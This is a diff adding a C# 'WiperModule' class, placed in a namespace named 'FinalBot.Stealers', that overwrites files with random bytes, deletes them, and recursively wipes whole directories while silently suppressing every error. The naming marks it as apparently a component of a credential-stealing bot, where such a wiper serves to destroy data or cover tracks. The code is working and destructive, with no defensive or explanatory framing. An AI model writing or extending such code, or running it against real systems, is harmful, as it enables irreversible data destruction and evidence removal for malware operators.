@@ -1,0 +1,57 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace FinalBot.Stealers
+{
+    public static class WiperModule
+    {
+        public static void WipeFile(string filePath, int passes = 1)
+        {
+            try 
+            {
+                if (!File.Exists(filePath)) return;
+
+                // Set attributes to normal before wiping
+                File.SetAttributes(filePath, FileAttributes.Normal);
+
+                long length = new FileInfo(filePath).Length;
+                using (var stream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
+                {
+                    byte[] buffer = new byte[65536];
+                    for (int p = 0; p < passes; p++)
+                    {
+                        long remaining = length;
+                        stream.Position = 0;
+                        while (remaining > 0)
+                        {
+                            int toWrite = (int)Math.Min(buffer.Length, remaining);
+                            RandomNumberGenerator.Fill(buffer);
+                            stream.Write(buffer, 0, toWrite);
+                            remaining -= toWrite;
+                        }
+                    }
+                }
+
+                File.Delete(filePath);
+            }
+            catch { }
+        }
+
+        public static void WipeDirectory(string dirPath)
+        {
+            try 
+            {
+                if (!Directory.Exists(dirPath)) return;
+
+                foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
+                {
+                    WipeFile(file);
+                }
+
+                Directory.Delete(dirPath, true);
+            }
+            catch { }
+        }
+    }
+}
